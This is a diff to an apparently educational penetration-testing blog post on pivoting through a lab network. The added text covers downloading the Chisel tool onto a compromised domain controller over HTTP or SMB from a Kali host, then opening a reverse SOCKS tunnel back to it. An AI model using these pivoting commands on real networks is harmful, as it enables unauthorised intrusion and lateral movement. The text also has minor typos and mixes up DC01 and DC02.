@@ -23,9 +23,9 @@ Third Pivot Machine: 172.18.3.20
 
 We are picking up from where Part 1 left off, with an established SSHuttle session to 172.18.1.0/24. At this point, I will assume you have comrpomised DC01, and have discovered 172.18.2.0/24, with DC02:
 
-<img src="/images/posts/pivoting/Pivoting_Part2_Initial.PNG" alt="pivoting-part2-initial" width="500"/>
+<img src="/images/posts/pivoting/Pivoting_Part2_Initial.PNG" alt="pivoting-part2-initial" width="700"/>
 
-<h3>Chisel</h3>
+<h3>Chisel Server</h3>
 
 First, you will need Chisel. Head to the GitHub, and download Chisel from Releases for the architecrture of the victim, and for your Kali. I will assume that the victim is Windows. [Here is the GitHub for Chisel](https://github.com/jpillora/chisel).
 
@@ -55,3 +55,48 @@ First, from your Kali machine, with a terminal open to the directory with your c
 {% highlight bash linenos %}
 python -m http.server 80
 {% endhighlight %}
+
+This will start a web server using port 80 on your Kali machine. From the DC01 victim machine, use PowerSHell's Invoke-WebRequest cmdlet to download chisel.exe:
+
+{% highlight bash linenos %}
+Invoke-WebRequest -URI http://10.10.15.100/chisel.exe -OutFile chisel.exe
+{% endhighlight %}
+
+<h4>SMB</h4>
+
+In some cases, http may be restricted. You can then use impacket's smb server. Start the smb server using terminal open to the directory with your chisel.exe file:
+
+{% highlight bash linenos %}
+impacket-smbserver share . -smb2support
+{% endhighlight %}
+
+The above starts a smb server on your Kali machine, where:
+
++ share : the name of your share, this can be anything, this is my goto share name
++ . : This is the directory you wish to share. A period represents the current directory
++ -smb2support : Support for SMBv2
+
+Once this is running, from the DC02 victim machine, copy the chisel.exe file:
+
+{% highlight bash linenos %}
+copy \\10.10.15.100\share\chisel.exe .
+{% endhighlight %}
+
+This will copy chisel.exe to the current working directory on the DC01 machine.
+
+<h3>Chisel Client</h3>
+
+Now, with Chisel on the victim, we can connect our DC01 agent to our Kali server. This is completed by running the following connand:
+
+{% highlight bash linenos %}
+./chisel.exe client 10.10.15.100:80 R:1080:socks
+{% endhighlight %}
+
+The above starts Chisel as a client on the victim, and connects back to our Kali machine:
+
++ 10.10.15.100:80 : The IP address and port, separated by a colon, of our Kali machine
++ R:1080:socks : A reverse proxy, using port 1080, using a SOCKS proxy. Important! Port 1080 is the port we used in our /etc/proxychains4.conf file, and must match!
+
+Once the client is connected, we can begin to tunnel our traffic into the second network, 172.18.2.0/24, and has access to DC02:
+
+<img src="/images/posts/pivoting/Pivoting-Chisel-1080.PNG" alt="pivoting-part2-chisel-1080" width="700"/>
